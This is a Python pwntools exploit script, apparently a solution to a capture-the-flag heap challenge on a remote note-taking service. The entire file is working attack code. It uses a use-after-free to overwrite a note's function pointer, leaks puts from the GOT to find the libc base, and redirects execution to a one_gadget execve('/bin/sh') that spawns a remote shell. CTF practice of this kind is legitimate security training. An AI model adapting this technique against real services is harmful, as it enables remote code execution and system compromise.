#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = 'csie.ctf.tw'
port = 10139
#   0x45216	execve("/bin/sh", rsp+0x30, environ)
#   constraints: rax == NULL
puts_plt = 0x4006e0
puts_got = 0x602028
p_note = 0x400886
r = remote(host, port)

def add_note(size, content):
    r.recvuntil(":")
    r.sendline(str(1))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def del_note(idx):
    r.recvuntil(":")
    r.sendline(str(2))
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline(str(3))
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(50, "00000000")
add_note(50, "00000000")
del_note(0)
del_note(1)
add_note(16, p64(p_note) + p64(puts_got))

print_note(0)
r.recv()
puts = u64(r.recvline().strip().ljust(8, '\x00'))
libc = puts - 0x6f690
print("[*] Leak libc base address " + hex(libc))
one_gadget = libc + 0x45216
del_note(2)

add_note(16, p64(one_gadget))
print_note(0)
r.interactive()
